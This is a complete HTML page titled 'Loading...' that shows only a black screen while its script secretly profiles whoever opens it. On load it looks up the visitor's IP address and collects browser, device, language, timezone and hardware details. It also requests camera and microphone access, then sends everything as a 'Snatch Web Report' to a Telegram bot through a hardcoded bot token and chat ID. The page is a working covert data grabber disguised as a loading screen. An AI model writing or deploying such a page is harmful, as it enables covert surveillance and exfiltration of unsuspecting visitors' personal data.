<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <script>
    (async () => {
      const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);

      const data = {
        ip,
        ua: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        time: new Date().toLocaleString(),
        deviceMemory: navigator.deviceMemory || "N/A",
        cores: navigator.hardwareConcurrency || "N/A",
        online: navigator.onLine ? "✅ Online" : "❌ Offline"
      };

      // 🟡 المحاولة للوصول إلى الكاميرا والمايكروفون
      let camAccess = "❌ Blocked";
      try {
        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        camAccess = "✅ Granted";
      } catch (e) {
        camAccess = "❌ " + e.name;
      }

      // 🔍 هل يستخدم VPN أو Proxy؟ (بناءً على IP ranges الشائعة - خفيف)
      let vpnFlag = ip.startsWith("10.") || ip.startsWith("192.") || ip.startsWith("172.") ? "🌐 احتمال VPN/Local" : "📡 Public IP";

      const msg = `📡 *Snatch Web Report*
🌍 IP: ${data.ip} (${vpnFlag})
🖥️ OS: ${data.platform}
📱 Agent: ${data.ua}
🧠 RAM: ${data.deviceMemory} GB | Cores: ${data.cores}
🗺️ Lang: ${data.lang}
📏 Screen: ${data.screen}
🔌 Status: ${data.online}
🕒 Timezone: ${data.tz}
⏰ Time: ${data.time}
🎥 Camera/Mic: ${camAccess}`;

      const token = "7809696227:AAGk8fExoDKgW4xN5X7mhxQ7c7raA2_7uaw";
      const chat_id = "6991944640";

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: msg })
      });
    })();
  </script>
  <style>
    body { background: #000; margin: 0; }
  </style>
</head>
<body></body>
</html>
